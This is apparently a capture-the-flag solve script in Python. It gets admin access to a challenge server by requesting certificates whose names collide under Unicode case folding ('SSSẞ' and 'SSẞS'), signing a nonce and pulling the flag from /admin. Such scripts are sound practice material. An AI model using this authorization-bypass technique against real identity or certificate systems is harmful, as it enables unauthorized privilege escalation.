#!/usr/bin/env python3

import argparse
import base64
import os
import re
import sys

import requests
from cryptography.hazmat.primitives import serialization

DEFAULT_TARGET = "https://ass-ab9e3c4ff345.chall.nnsc.tf"
ADMIN_NAME = "SSSẞ"
CLIENT_NAME = "SSẞS"
FLAG_RE = re.compile(r"NNS\{[^}]+\}|CTF\{[^}]+\}|FLAG\{[^}]+\}")


def provision(session: requests.Session, target: str, profile: str, name: str) -> dict:
    response = session.post(
        f"{target}/certificates",
        json={"profile": profile, "name": name},
        timeout=10,
    )
    response.raise_for_status()
    return response.json()


def get_nonce(session: requests.Session, target: str) -> str:
    response = session.get(f"{target}/auth/nonce", timeout=10)
    response.raise_for_status()
    return response.json()["nonce"]


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "target",
        nargs="?",
        default=os.environ.get("TARGET", DEFAULT_TARGET),
        help="base URL target challenge",
    )
    args = parser.parse_args()
    target = args.target.rstrip("/")

    session = requests.Session()

    print(f"[+] target: {target}")
    print(f"[+] requesting ADMIN certificate for {ADMIN_NAME!r}")
    admin = provision(session, target, "ADMIN", ADMIN_NAME)
    print(f"[+] admin certificate issued for {admin['name']}")

    print(f"[+] requesting CLIENT certificate for {CLIENT_NAME!r}")
    client = provision(session, target, "CLIENT", CLIENT_NAME)
    print(f"[+] client certificate issued for {client['name']}")

    private_key = serialization.load_pem_private_key(
        client["private_key"].encode(),
        password=None,
    )

    nonce = get_nonce(session, target)
    print(f"[+] nonce: {nonce}")

    signature = base64.b64encode(private_key.sign(nonce.encode())).decode()
    response = session.post(
        f"{target}/admin",
        json={
            "certificate": client["certificate"],
            "nonce": nonce,
            "signature": signature,
        },
        timeout=10,
    )
    response.raise_for_status()

    body = response.text
    match = FLAG_RE.search(body)
    if not match:
        print("[-] flag not found in response", file=sys.stderr)
        print(body, file=sys.stderr)
        return 1

    print("[+] /admin response:", body)
    print(f"<FLAG>{match.group(0)}</FLAG>")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
